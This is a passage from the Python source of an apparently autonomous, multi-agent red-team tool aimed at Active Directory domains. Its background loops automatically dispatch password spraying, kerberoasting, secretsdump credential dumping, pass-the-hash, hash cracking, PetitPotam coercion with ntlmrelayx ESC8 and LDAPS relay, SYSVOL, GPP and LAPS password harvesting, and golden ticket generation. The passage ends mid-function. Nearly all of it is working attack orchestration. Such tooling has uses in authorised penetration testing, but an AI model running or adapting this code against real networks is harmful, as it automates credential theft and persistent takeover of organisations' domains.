                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_password_spray",
                        techniques=["password_spray"],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_password_spray.add(domain.lower())
                    if task_id:
                        logger.info(
                            f"Auto password_spray dispatched for {len(domain_users)} users in {domain}"
                        )

            # Get DC IPs for smart targeting
            dc_ips = _get_dc_ips(state)

            for cred in state.all_credentials:
                # Skip credentials without valid username - can't use for authenticated techniques
                if not cred.username or not cred.username.strip():
                    continue
                key = _make_cred_key(cred.username, cred.domain or "", cred.password or "")
                if key in state.processed_cred_expansion:
                    continue
                domain_name = cred.domain or (state.target.domain if state.target else "")
                domain_hosts = _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips

                # Separate DC hosts from non-DC hosts for smart credential usage
                non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
                dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]

                # For non-DC hosts: always try secretsdump (might have local admin)
                cred_task_id: str | None = None
                if non_dc_hosts:
                    cred_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=non_dc_hosts,
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="new_credential_non_dc",
                        techniques=["kerberoast", "secretsdump"],
                    )

                # For DC hosts: only try secretsdump if credential is privileged OR
                # there's no constrained delegation path (S4U) available
                for dc_ip in dc_hosts_in_domain:
                    has_s4u_path = _has_constrained_delegation_for_target(state, dc_ip)
                    is_privileged = _is_likely_privileged_credential(cred.username, cred.source)

                    if has_s4u_path and not is_privileged:
                        # Skip secretsdump - let the S4U attack path handle this DC
                        logger.info(
                            f"Skipping secretsdump on DC {dc_ip} for {cred.username}: "
                            f"constrained delegation path exists, use S4U instead"
                        )
                        continue

                    # Either privileged credential or no S4U path - try secretsdump
                    dc_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=[dc_ip],
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="new_credential_dc",
                        techniques=["kerberoast", "secretsdump"],  # No lsassy on DCs
                    )
                    if dc_task_id and not cred_task_id:
                        cred_task_id = dc_task_id

                # Also dispatch FAST credential discovery separately (only needs DC targets)
                # These are high-value low-hanging fruit that take ~2-5 seconds each
                # Running them separately ensures they complete quickly without getting
                # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
                # NOTE: These techniques require password auth (not hash), skip if no password
                if cred.password:
                    dc_targets = dc_hosts_in_domain or domain_hosts[:1]
                    await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=dc_targets,
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="fast_credential_discovery",
                        techniques=[
                            "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
                            "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
                            "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
                            "laps_dump",  # ~2 sec, LAPS local admin passwords
                        ],
                    )
                # Always mark as processed to prevent retry storm when throttled
                # The deferred queue handles actual retries for deferred tasks
                state.processed_cred_expansion.add(key)
                if cred_task_id:
                    logger.info(
                        f"Auto credential access dispatched for {cred.domain or '(unknown)'}\\{cred.username} (source={cred.source or 'unknown'})"
                    )

            for hash_obj in state.all_hashes:
                hash_key = _make_hash_key(
                    hash_obj.username, hash_obj.domain or "", hash_obj.hash_value
                )
                # Credential access (pass-the-hash) only for NTLM-compatible hashes
                if hash_key not in state.processed_hash_lateral:
                    if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
                        logger.info(
                            f"Skipping credential access for {hash_obj.domain or '(unknown)'}\\{hash_obj.username}: non-NTLM hash type {hash_obj.hash_type or 'unknown'}"
                        )
                        state.processed_hash_lateral.add(hash_key)
                    else:
                        domain_name = hash_obj.domain or (
                            state.target.domain if state.target else ""
                        )
                        domain_hosts = (
                            _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips
                        )

                        # Separate DC hosts from non-DC hosts for smart hash usage
                        non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
                        dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]

                        # For non-DC hosts: always try pass-the-hash
                        hash_task_id: str | None = None
                        if non_dc_hosts:
                            hash_task_id = await dispatcher.request_credential_access(
                                source_agent="orchestrator",
                                domain=domain_name,
                                target_ips=non_dc_hosts,
                                username=hash_obj.username,
                                hash_value=hash_obj.hash_value,
                                hash_type=hash_obj.hash_type,
                                reason="new_hash_non_dc",
                                techniques=["kerberoast", "secretsdump"],
                            )

                        # For DC hosts: only try if privileged or no S4U path
                        for dc_ip in dc_hosts_in_domain:
                            has_s4u_path = _has_constrained_delegation_for_target(state, dc_ip)
                            is_privileged = _is_likely_privileged_credential(
                                hash_obj.username, hash_obj.source
                            )

                            if has_s4u_path and not is_privileged:
                                logger.info(
                                    f"Skipping secretsdump on DC {dc_ip} for {hash_obj.username} (hash): "
                                    f"constrained delegation path exists, use S4U instead"
                                )
                                continue

                            dc_task_id = await dispatcher.request_credential_access(
                                source_agent="orchestrator",
                                domain=domain_name,
                                target_ips=[dc_ip],
                                username=hash_obj.username,
                                hash_value=hash_obj.hash_value,
                                hash_type=hash_obj.hash_type,
                                reason="new_hash_dc",
                                techniques=["kerberoast", "secretsdump"],
                            )
                            if dc_task_id and not hash_task_id:
                                hash_task_id = dc_task_id

                        # Always mark as processed to prevent retry storm when throttled
                        state.processed_hash_lateral.add(hash_key)
                        if hash_task_id:
                            logger.info(
                                f"Auto credential access dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} (hash_type={hash_obj.hash_type or 'unknown'})"
                            )

                # Crack requests for ALL hashes (AS-REP, Kerberoast, NTLM, etc.)
                crack_key = _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )
                if hash_obj.cracked_password:
                    state.processed_crack_requests.add(crack_key)
                    continue
                if crack_key in state.processed_crack_requests:
                    continue

                # Determine priority based on hash type
                # Kerberoast hashes have higher priority - service accounts often have weak passwords
                # AS-REP hashes also get boosted priority
                crack_priority = 5  # Default priority
                hash_value_lower = hash_obj.hash_value.lower()
                hash_type_upper = (hash_obj.hash_type or "").upper()

                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                    crack_priority = 2  # High priority - service accounts often weak
                    logger.info(
                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                    )
                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                    crack_priority = 3  # Medium-high priority
                    logger.info(
                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                    )

                crack_task_id = await dispatcher.request_crack(
                    hash_value=hash_obj.hash_value,
                    hash_type=hash_obj.hash_type,
                    source_agent="orchestrator",
                    username=hash_obj.username,
                    domain=hash_obj.domain,
                    priority=crack_priority,
                )
                # Always mark as processed to prevent retry storm when throttled
                # The deferred queue handles actual retries for deferred tasks
                state.processed_crack_requests.add(crack_key)
                if crack_task_id:
                    logger.info(
                        f"Auto crack dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} ({hash_obj.hash_type or 'unknown'}, priority={crack_priority})"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential access error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_crack_dispatch(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Dedicated background task for dispatching hash crack requests.

    This runs independently of _auto_credential_access to ensure crack tasks
    are always dispatched promptly when new hashes are discovered.

    Processes: AS-REP, Kerberoast, and other crackable hash types.
    """
    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # NOTE: Don't exit on has_domain_admin - we still want to crack hashes
            # after DA for reporting/persistence. Crack tasks don't use LLM tokens.
            if state.completed:
                logger.debug("Operation complete, stopping auto crack dispatch")
                break

            if not state.all_hashes:
                continue

            for hash_obj in state.all_hashes:
                # Skip already cracked
                if hash_obj.cracked_password:
                    continue

                # Build crack key for deduplication
                crack_key = _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )

                if crack_key in state.processed_crack_requests:
                    continue

                # Determine priority based on hash type
                crack_priority = 5  # Default
                hash_value_lower = hash_obj.hash_value.lower()
                hash_type_upper = (hash_obj.hash_type or "").upper()

                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                    crack_priority = 2  # High priority - service accounts
                    logger.info(
                        f"Auto-crack: Kerberoast hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )
                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                    crack_priority = 3  # Medium-high priority
                    logger.info(
                        f"Auto-crack: AS-REP hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )
                else:
                    logger.info(
                        f"Auto-crack: {hash_obj.hash_type} hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )

                crack_task_id = await dispatcher.request_crack(
                    hash_value=hash_obj.hash_value,
                    hash_type=hash_obj.hash_type or "unknown",
                    source_agent="orchestrator",
                    username=hash_obj.username,
                    domain=hash_obj.domain or "",
                    priority=crack_priority,
                )

                # Always mark as processed to prevent retry storm when throttled
                # The deferred queue handles actual retries for deferred tasks
                state.processed_crack_requests.add(crack_key)
                if crack_task_id:
                    logger.info(
                        f"Auto-crack dispatched: {hash_obj.domain}\\{hash_obj.username} ({hash_obj.hash_type}) -> {crack_task_id}"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto crack dispatch error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_coercion(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that automatically triggers coercion attacks when conditions are met.

    Monitors for:
    1. ADCS servers with web enrollment → ESC8 relay attacks (ntlmrelayx + petitpotam)
    2. Domain controllers → petitpotam/coercer coercion for credential relay
    3. Writable shares → potential for file-based coercion (.lnk/.scf drops)

    This automates the coercion workflow that attackers would normally coordinate manually.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between coercion checks
    """
    # NOTE: All tracking now uses state fields for restart recovery
    # - state.processed_esc8_servers: ADCS servers we've started ESC8 against
    # - state.processed_state.processed_coerced_dcs: DCs we've attempted to coerce
    # - state.processed_writable_shares: "host:share" combos notified

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto coercion")
                break

            # Need at least some credentials to make coercion worthwhile
            # (captured hashes need to be relayed or cracked)
            if not state.all_credentials and not state.all_hashes:
                logger.debug("Auto coercion: waiting for credentials before starting coercion")
                continue

            # Helper function to detect Domain Controllers
            def _is_dc(host: Host) -> bool:
                """Check if host is a Domain Controller.

                Detection methods:
                1. Explicit DC roles (from SRV lookup or BloodHound)
                2. DC services (Kerberos 88, LDAP 389)
                3. Hostname contains "dc"
                """
                # Check explicit roles (from SRV lookup, BloodHound, or manual tagging)
                if any(
                    r.lower() in ("dc", "domain controller", "domaincontroller", "ad dc")
                    for r in (host.roles or [])
                ):
                    return True
                # Check DC-like services (Kerberos, LDAP)
                for svc in host.services or []:
                    svc_lower = svc.lower()
                    if svc_lower.startswith(("88/tcp", "389/tcp")):
                        return True
                    if "kerberos" in svc_lower or "ldap" in svc_lower:
                        return True
                # Check if hostname contains "dc"
                return "dc" in (host.hostname or "").lower()

            # === ESC8 RELAY ATTACK ===
            # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
            adcs_servers = dispatcher.find_adcs_servers()
            for server_ip, server_hostname in adcs_servers:
                if server_ip in state.processed_esc8_servers:
                    continue

                # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
                dcs = [
                    h
                    for h in state.all_hosts
                    if _is_dc(h) and h.ip != server_ip  # Don't coerce the ADCS server to itself
                ]

                if not dcs:
                    logger.debug(f"Auto coercion: ADCS {server_ip} found but no DCs to coerce yet")
                    continue

                # Pick the first available DC
                target_dc = dcs[0]

                # Dispatch ESC8 coercion task
                # This will start ntlmrelayx to ADCS and coerce the DC
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "esc8",
                        "adcs_server": server_ip,
                        "adcs_hostname": server_hostname,
                        "coerce_target": target_dc.ip,
                        "coerce_hostname": target_dc.hostname,
                        "note": (
                            f"ESC8 RELAY ATTACK: Start ntlmrelayx targeting "
                            f"http://{server_hostname or server_ip}/certsrv/ with template "
                            f"DomainController, then coerce {target_dc.hostname or target_dc.ip} "
                            f"with petitpotam to get DC certificate for domain admin."
                        ),
                    },
                )

                # Always mark as processed to prevent retry storm when throttled
                state.processed_esc8_servers.add(server_ip)
                if task_id:
                    logger.info(
                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
                    )

            # === DC COERCION FOR LDAPS RELAY ===
            # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
            for host in state.all_hosts:
                # Reuse the _is_dc function defined above for ESC8
                if not _is_dc(host) or host.ip in state.processed_coerced_dcs:
                    continue

                # Only coerce if we have credentials to authenticate the relay
                if not state.all_credentials:
                    continue

                # Dispatch LDAPS relay coercion
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "ldaps_relay",
                        "coerce_target": host.ip,
                        "coerce_hostname": host.hostname,
                        "relay_target": host.ip,  # Relay to same DC's LDAPS
                        "note": (
                            f"LDAPS RELAY: Start ntlmrelayx targeting ldaps://{host.ip} with "
                            f"--delegate-access, then coerce {host.hostname or host.ip} with "
                            f"petitpotam to create machine account for RBCD attack."
                        ),
                    },
                )

                # Always mark as processed to prevent retry storm when throttled
                state.processed_coerced_dcs.add(host.ip)
                if task_id:
                    logger.info(
                        f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
                        f"for RBCD (task {task_id})"
                    )
                # Only do one DC at a time to avoid overwhelming the coercion agent
                break

            # === WRITABLE SHARE NOTIFICATION ===
            # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
            # Note: slinky module not currently available, but we flag the opportunity
            for share in state.all_shares:
                perms = (share.permissions or "").upper()
                if "WRITE" not in perms:
                    continue

                share_key = f"{share.host.lower()}:{share.name.lower()}"
                if share_key in state.processed_writable_shares:
                    continue

                # Skip admin shares
                if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
                    continue

                state.processed_writable_shares.add(share_key)
                logger.info(
                    f"Writable share detected: {share.host}/{share.name} ({perms}) - potential for file-based coercion"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto coercion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_delegation_enumeration(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 15.0,
) -> None:
    """
    Background task that automatically runs delegation enumeration for discovered credentials.

    When credentials are discovered, dispatches find_delegation tasks to enumerate:
    - Unconstrained delegation (machines that can impersonate any user)
    - Constrained delegation (machines that can impersonate to specific services)

    These are high-value targets for privilege escalation.

    Note: Immediate delegation dispatch also happens in publish_credential() for cracked
    hashes. This periodic loop serves as a backup for other credential sources.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials (default: 15s for faster detection)
    """
    # NOTE: Processed credentials are persisted in state.processed_delegation_creds
    # Format: "domain:username" - successful delegation enumerations
    # Track dispatched tasks: task_id -> cred_key (transient, for completion tracking)
    dispatched_tasks: dict[str, str] = {}

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping delegation enumeration")
                break

            # Check for completed/failed tasks and update state accordingly
            completed_task_ids = list(dispatched_tasks.keys())
            for task_id in completed_task_ids:
                cred_key = dispatched_tasks[task_id]

                # Check if task is still pending (running)
                if task_id in state.pending_tasks:
                    continue  # Still running, check later

                # Task finished - check if it succeeded or failed
                task_result = state.completed_tasks.get(task_id)
                if task_result:
                    # Remove from dispatched regardless of outcome
                    del dispatched_tasks[task_id]

                    if task_result.success:
                        # Task succeeded - persist to state (won't retry after restart)
                        state.processed_delegation_creds.add(cred_key)
                        logger.info(f"Auto-delegation task {task_id} succeeded for {cred_key}")
                    else:
                        # Task failed - DON'T add to state so it can be retried
                        logger.warning(
                            f"Auto-delegation task {task_id} failed for {cred_key}: {task_result.error}. Will retry."
                        )
                else:
                    # Task not in pending or completed - probably lost, allow retry
                    logger.warning(
                        f"Auto-delegation task {task_id} missing for {cred_key}, allowing retry"
                    )
                    del dispatched_tasks[task_id]

            # Need credentials to enumerate delegation
            if not state.all_credentials:
                logger.debug("Auto-delegation: waiting for credentials")
                continue

            # Find new credentials with passwords
            for cred in state.all_credentials:
                if not cred.password:
                    continue

                cred_key = f"{(cred.domain or '').lower()}:{cred.username.lower()}"

                # Skip if already processed successfully (persisted in state)
                if cred_key in state.processed_delegation_creds:
                    continue

                # Skip if currently dispatched (task in flight)
                if cred_key in dispatched_tasks.values():
                    continue

                # Get domain for this credential
                domain = cred.domain or (state.target.domain if state.target else "")
                if not domain:
                    continue

                # Dispatch delegation enumeration to PRIVESC agent (has DelegationTools)
                # Note: request_privesc_enumeration() has its own deduplication check against
                # pending_tasks, so it may return "" if a task already exists for this credential.
                task_id = await dispatcher.request_privesc_enumeration(
                    source_agent="orchestrator",
                    domain=domain,
                    username=cred.username,
                    password=cred.password,
                    techniques=["find_delegation"],
                )

                if task_id and task_id != "deferred":
                    # Track as dispatched - will be marked processed only on success
                    dispatched_tasks[task_id] = cred_key
                    logger.info(
                        f"Auto-delegation: dispatched find_delegation task {task_id} "
                        f"for {cred.domain}\\{cred.username}"
                    )
                elif task_id == "deferred":
                    # Task queued to deferred queue - will run when capacity allows
                    logger.debug(
                        f"Auto-delegation: find_delegation for {cred.domain}\\{cred.username} "
                        "deferred to background queue"
                    )
                else:
                    # Task was deduplicated (already pending)
                    logger.debug(
                        f"Auto-delegation: find_delegation for {cred.domain}\\{cred.username} "
                        "already pending"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto delegation enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_local_admin_secretsdump(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
) -> None:
    """
    Background task that automatically runs secretsdump when local admin access is detected.

    When BloodHound or CME identifies that a user has local admin rights on a host,
    this workflow automatically dispatches secretsdump to harvest credentials.

    This catches scenarios like:
    - User is member of local Administrators group
    - User has AdminTo relationship in BloodHound
    - CME reports "Pwn3d!" for a credential/host combination

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for admin access opportunities
    """
    # Track (host_ip, username, domain) -> task_id for in-flight deduplication (transient)
    secretsdump_attempts: dict[tuple[str, str, str], str] = {}
    # NOTE: successful hosts are persisted in state.processed_secretsdump for restart recovery
    failed_attempts: dict[tuple[str, str, str], int] = {}  # Track failures for retry limiting
    max_retries = 2

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto local admin secretsdump")
                break

            # Check completed tasks to update tracking
            for key, task_id in list(secretsdump_attempts.items()):
                host_ip, username, domain = key

                # Skip deferred tasks - they're queued but not yet submitted
                # The deferred queue processor will handle them
                if task_id == "deferred":
                    continue

                # Check if task completed
                if task_id not in state.pending_tasks:
                    task_result = state.completed_tasks.get(task_id)
                    if task_result and task_result.success:
                        # Persist successful host to state for restart recovery
                        state.processed_secretsdump.add(host_ip)
                        logger.info(
                            f"Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
                        )
                    elif task_result and not task_result.success:
                        failed_attempts[key] = failed_attempts.get(key, 0) + 1
                        logger.warning(
                            f"Auto-secretsdump failed on {host_ip} with {domain}\\{username}: {task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
                        )
                    del secretsdump_attempts[key]

            # Find credentials marked as admin
            admin_creds = [c for c in state.all_credentials if c.is_admin and c.password]

            if not admin_creds:
                logger.debug("Auto-secretsdump: no admin credentials found yet")
                continue

            # For each admin credential, try to run secretsdump on relevant hosts
            for cred in admin_creds:
                cred_domain = cred.domain or ""

                # Find hosts in the same domain or hosts where this cred was marked admin
                target_hosts = []
                for host in state.all_hosts:
                    # Skip already successful hosts
                    if host.ip in state.processed_secretsdump:
                        continue

                    # Skip hosts without IP
                    if not host.ip:
                        continue

                    # Check if credential source mentions this host (e.g., "Pwn3d! on 192.168.58.10")
                    source_lower = cred.source.lower()
                    if host.ip in source_lower or (
                        host.hostname and host.hostname.lower() in source_lower
                    ):
                        target_hosts.append(host)
                        continue

                    # Check if host is a DC for the credential's domain (high value target)
                    if host.is_dc and cred_domain:
                        hostname_lower = (host.hostname or "").lower()
                        if cred_domain.lower() in hostname_lower:
                            target_hosts.append(host)

                for host in target_hosts:
                    key = (host.ip, cred.username.lower(), cred_domain.lower())

                    # Skip if already attempted and in-flight
                    if key in secretsdump_attempts:
                        continue

                    # Skip if max retries reached
                    if failed_attempts.get(key, 0) >= max_retries:
                        continue

                    # Dispatch secretsdump task
                    logger.info(
                        f"🔓 Auto-secretsdump: Admin access detected for {cred_domain}\\{cred.username} "
                        f"on {host.ip} ({host.hostname}), dispatching secretsdump"
                    )

                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=cred_domain or (state.target.domain if state.target else ""),
                        target_ips=[host.ip],
                        username=cred.username,
                        password=cred.password,
                        reason="auto_local_admin_secretsdump",
                        techniques=["secretsdump"],
                    )

                    if task_id and task_id != "deferred":
                        secretsdump_attempts[key] = task_id
                        logger.info(
                            f"Auto-secretsdump task {task_id} dispatched for "
                            f"{cred_domain}\\{cred.username} -> {host.ip}"
                        )
                    elif task_id == "deferred":
                        # Task queued to deferred queue - mark as attempted to prevent retry storm
                        secretsdump_attempts[key] = "deferred"
                        logger.debug(
                            f"Auto-secretsdump for {cred_domain}\\{cred.username} -> {host.ip} "
                            "deferred to background queue"
                        )

            # Also check for BloodHound AdminTo relationships
            # These are stored in discovered_vulnerabilities with local_admin type
            for vuln_id, vuln in state.discovered_vulnerabilities.items():
                if vuln.vuln_type not in ("local_admin", "AdminTo", "CanRDP"):
                    continue

                if vuln_id in state.exploited_vulnerabilities:
                    continue

                target_ip = vuln.target
                if not target_ip or target_ip in state.processed_secretsdump:
                    continue

                # Get details about who has admin access
                # Defensive: ensure vuln.details is a dict before calling .get()
                details = vuln.details if isinstance(vuln.details, dict) else {}
                admin_user = details.get("username") or details.get("principal")
                admin_domain = details.get("domain", "")

                if not admin_user:
                    continue

                # Find matching credential
                matching_cred = None
                for cred in state.all_credentials:
                    if (
                        cred.username.lower() == admin_user.lower()
                        and cred.password
                        and (not admin_domain or cred.domain.lower() == admin_domain.lower())
                    ):
                        matching_cred = cred
                        break

                if not matching_cred:
                    logger.debug(
                        f"Auto-secretsdump: Found {vuln.vuln_type} for {admin_user} on {target_ip} "
                        f"but no matching password credential"
                    )
                    continue

                key = (target_ip, admin_user.lower(), admin_domain.lower())

                if key in secretsdump_attempts or failed_attempts.get(key, 0) >= max_retries:
                    continue

                logger.info(
                    f"🔓 Auto-secretsdump: BloodHound {vuln.vuln_type} detected - "
                    f"{admin_domain}\\{admin_user} has admin on {target_ip}, dispatching secretsdump"
                )

                task_id = await dispatcher.request_credential_access(
                    source_agent="orchestrator",
                    domain=admin_domain or (state.target.domain if state.target else ""),
                    target_ips=[target_ip],
                    username=matching_cred.username,
                    password=matching_cred.password,
                    reason=f"auto_bloodhound_{vuln.vuln_type}",
                    techniques=["secretsdump"],
                )

                if task_id and task_id != "deferred":
                    secretsdump_attempts[key] = task_id
                    # Mark vulnerability as exploited to avoid re-processing
                    state.mark_exploited(vuln_id)
                    logger.info(
                        f"Auto-secretsdump task {task_id} dispatched for BloodHound {vuln.vuln_type}"
                    )
                elif task_id == "deferred":
                    # Task queued to deferred queue - mark as attempted to prevent retry storm
                    secretsdump_attempts[key] = "deferred"
                    state.mark_exploited(vuln_id)
                    logger.debug(
                        f"Auto-secretsdump for BloodHound {vuln.vuln_type} deferred to background queue"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto local admin secretsdump error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


class TransientToolError(Exception):
    """Raised when a tool fails due to transient infrastructure issues (Redis timeout, network)."""


def _is_transient_tool_error(stderr: str, return_code: int) -> bool:
    """Check if a tool error is transient and worth retrying.

    Transient errors include Redis timeouts, network issues, and cases where
    the command didn't execute at all. Permanent errors include authentication
    failures and actual tool output that doesn't contain expected data.

    Args:
        stderr: Standard error output from the tool
        return_code: Exit code from the tool

    Returns:
        True if the error appears transient and should be retried
    """
    # Redis/network errors are transient
    transient_patterns = [
        "timeout reading from redis",
        "connectionerror",
        "connection refused",
        "name or service not known",
        "network is unreachable",
        "timed out",
        "connection reset",
        "broken pipe",
        "no route to host",
    ]
    stderr_lower = stderr.lower()
    for pattern in transient_patterns:
        if pattern in stderr_lower:
            return True

    # Empty stderr with non-zero exit often means command didn't execute
    # (infrastructure failure before tool could run)
    return bool(return_code != 0 and not stderr.strip())


def _run_lookupsid_with_retry(
    cmd: list[str],
    timeout_seconds: int = 60,
    max_attempts: int = 3,
) -> tuple[str, str, int]:
    """Run impacket-lookupsid with retry on transient errors.

    Uses exponential backoff with jitter to handle Redis timeouts and
    network issues gracefully. Only retries transient errors - permanent
    failures (auth errors, etc.) fail immediately.

    Args:
        cmd: The lookupsid command to execute
        timeout_seconds: Timeout for each attempt
        max_attempts: Maximum number of retry attempts

    Returns:
        Tuple of (stdout, stderr, return_code)

    Raises:
        TransientToolError: If all retries exhausted due to transient errors
    """
    from ares.tools.red.common import run_tool

    @retry(
        stop=stop_after_attempt(max_attempts),
        wait=wait_random_exponential(multiplier=1, max=30),
        retry=retry_if_exception_type(TransientToolError),
        reraise=True,
    )
    def _execute() -> tuple[str, str, int]:
        stdout, stderr, return_code = run_tool(cmd, timeout_seconds=timeout_seconds)

        if return_code != 0 and _is_transient_tool_error(stderr, return_code):
            err_preview = stderr[:150] if stderr else "empty stderr"
            logger.warning(f"🎫 Transient lookupsid error (will retry): {err_preview}")
            raise TransientToolError(f"Transient error: {stderr[:200] if stderr else 'no output'}")

        return stdout, stderr, return_code

    return _execute()


async def _auto_golden_ticket(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task that automatically generates golden ticket when krbtgt hash is found.

    Monitors the shared state for krbtgt hashes and automatically:
    1. Extracts domain SID via lookupsid
    2. Generates golden ticket with impacket-ticketer
    3. Stores ticket info in state.golden_tickets (persisted to Redis)
    4. Sets has_golden_ticket flag in state

    This provides persistent domain admin access.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks
    """
    import re

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Get domains that already have golden tickets (from persisted state)
            processed_domains = {
                t.get("domain", "").lower() for t in state.golden_tickets if t.get("domain")
            }

            # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
            # This ensures we process any krbtgt hashes even if the orchestrator
            # marked the operation complete while we were sleeping.
            pending_krbtgt_domains = set()
            for hash_obj in state.all_hashes:
                if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
                    domain = (hash_obj.domain or "").lower()
                    if domain and domain not in processed_domains:
                        pending_krbtgt_domains.add(domain)

            # Only exit if operation is complete AND no unprocessed krbtgt hashes
            if state.completed and not pending_krbtgt_domains:
                logger.debug(
                    "Operation complete and no pending krbtgt hashes, stopping auto golden ticket"
                )
                break

            # Look for krbtgt hashes we haven't processed yet
            for hash_obj in state.all_hashes:
                if hash_obj.username.lower() != "krbtgt":
                    continue

                if hash_obj.hash_type.lower() != "ntlm":
                    continue

                domain = hash_obj.domain
                if not domain or domain.lower() in processed_domains:
                    continue

                # Found unprocessed krbtgt hash!
                logger.info(
                    f"🎫 Auto-golden-ticket: Found krbtgt hash for {domain}, "
                    "attempting to generate golden ticket"
                )

                # Need a credential or hash to run lookupsid
                # First try password credential, then fall back to hash-based auth
                cred = None
                auth_hash = None

                # Try to find password credential for this domain first
                for c in state.all_credentials:
                    if c.password and c.domain and c.domain.lower() == domain.lower():
                        cred = c
                        break

                if not cred:
                    # Try any password credential
                    for c in state.all_credentials:
                        if c.password:
                            cred = c
                            break

                if not cred:
                    # No password credential - try hash-based auth
                    # Look for any NTLM hash we can use (prefer same domain, exclude krbtgt)
                    for h in state.all_hashes:
                        if h.hash_type.lower() != "ntlm":
                            continue
                        # Skip krbtgt - it's a service account, use a user account
                        if h.username.lower() == "krbtgt":
                            continue
                        # Prefer same domain
                        if h.domain and h.domain.lower() == domain.lower():
                            auth_hash = h
                            break

                    if not auth_hash:
                        # Try any NTLM hash (cross-domain auth may work)
                        for h in state.all_hashes:
                            if h.hash_type.lower() == "ntlm" and h.username.lower() != "krbtgt":
                                auth_hash = h
                                break

                if not cred and not auth_hash:
                    logger.warning(
